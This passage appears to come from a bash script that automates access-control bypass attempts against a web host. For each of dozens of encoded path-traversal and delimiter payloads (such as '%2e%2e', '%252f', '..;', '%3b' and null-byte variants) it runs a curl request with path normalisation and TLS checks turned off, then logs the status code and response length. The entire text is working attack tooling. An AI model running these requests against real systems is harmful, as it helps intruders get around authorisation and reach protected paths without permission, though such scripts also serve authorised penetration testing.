echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f%252f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f%252f$PAT" -H "$user_agent")
print
echo -n "Payload [ %252f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f/$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%20%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%20%23$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%20%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%23$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3b%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%3f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%3f/$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%09$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%09$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e%2e%2f%2e%2e%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f%2e.$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b%2f.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b%2f..$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e%2e/..%2f%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e%2e/..%2f%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2e.$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/%2f%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2f%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/%2f%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b/.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b/..$PAT" -H "$user_agent")
print
echo -n "Payload [ %3b//%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b//%2f../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3b//%2f../$PAT" -H "$user_agent")
print
echo -n "Payload [ %3f%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%23$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %3f%3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%3f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ .. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%00/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT;" -H "$user_agent")
print
echo -n "Payload [ ..%00;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%09$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%09$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%0d/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%0d;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%5c/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%ff/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff/;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff/;$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%ff;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff;/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;%00/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%00/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%00/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;%0d/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%0d/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%0d/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;%ff/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%ff/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;%ff/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;\ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\\$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\\$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;\; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;\;$PAT" -H "$user_agent")
print
echo -n "Payload [ ..\; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\;$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\;$PAT" -H "$user_agent")
print
echo -n "Payload [ /%20# ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT#" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT#" -H "$user_agent")
print
echo -n "Payload [ /%20%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20%23$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20%23$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%252f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%252f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%252f/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%253b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%253b/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252e%253b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%252f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%252f/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e%253b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%253b/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e%253b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%252f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%252f$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e%3b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e%3b/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e%3b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2f/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%2f/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e%3b//$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e//$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /%3b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%3b/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%3b/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..$PAT" -H "$user_agent")
print
echo -n "Payload [ /..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f..%2f$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..%2f..%2f..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../../..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../../..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /../..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /../..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ /.././../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.././../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.././../$PAT" -H "$user_agent")
print
echo -n "Payload [ /../.;/../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../.;/../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../.;/../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//$PAT" -H "$user_agent")
print
echo -n "Payload [ /..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../$PAT" -H "$user_agent")
print
echo -n "Payload [ /..//../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..//../../$PAT" -H "$user_agent")
print
